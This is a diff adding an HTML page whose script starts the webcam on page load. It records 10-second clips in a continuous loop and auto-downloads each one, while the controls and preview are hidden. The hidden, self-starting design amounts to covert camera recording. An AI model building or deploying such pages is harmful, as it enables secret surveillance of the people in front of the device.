@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>saurabhreigns001EmailId</title>
+</head>
+<body>
+<div>
+  <button hidden onclick="startrecording()" id="startButton">Start Recording</button>
+  <button hidden onclick="stopbtn()" id="stopButton" disabled>Stop Recording</button>
+  <button hidden onclick="downloadVdo()" id="downloadButton" disabled>Download Video</button>
+</div>
+<video id="videoElement" width="400" autoplay hidden></video>
+
+<script>
+// Get the video element
+const videoElement = document.getElementById('videoElement');
+
+// Get the buttons
+const startButton = document.getElementById('startButton');
+const stopButton = document.getElementById('stopButton');
+const downloadButton = document.getElementById('downloadButton');
+
+// Initialize media recorder variable
+let mediaRecorder;
+let recordedChunks = [];
+
+// Function to handle when the start button is clicked
+function startrecording() {
+    
+  // Disable start button
+  startButton.disabled = true;
+  // Enable stop button
+  stopButton.disabled = false;
+  // Start recording
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      videoElement.srcObject = stream;
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = handleDataAvailable;
+      mediaRecorder.start();
+    })
+    .catch((err) => {
+      console.error('Error accessing camera:', err);
+    });
+delay(stopbtn,10000);
+};
+
+// Function to handle when the stop button is clicked
+function stopbtn() {
+  // Disable stop button
+  stopButton.disabled = true;
+  // Stop recording
+  mediaRecorder.stop();
+};
+
+// Function to handle when data is available
+function handleDataAvailable(event) {
+  if (event.data.size > 0) {
+    recordedChunks.push(event.data);
+    // Enable download button
+    downloadButton.disabled = false;
+  }
+  delay(downloadVdo,1000);
+};
+
+// Function to download the recorded video
+function downloadVdo() {
+    startButton.disabled = false;
+  const blob = new Blob(recordedChunks, { type: 'video/webm' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'recorded-video.webm';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => {
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+  }, 0);
+  recordedChunks = [];
+  delay(startrecording,1000)
+};
+// Define a function to be executed after a delay
+function delay(callback, delayTime) {
+  // Execute the callback function after the specified delay
+  setTimeout(callback, delayTime);
+}
+
+// Define a callback function to be executed after the delay
+
+
+
+startrecording();
+// Call the delay function and pass the callback function and delay time
+//delay(delayedFunction, 2000); // This will execute the delayedFunction after 2000 milliseconds (2 seconds)
+
+</script>
+</script>
+</body>
+</html>
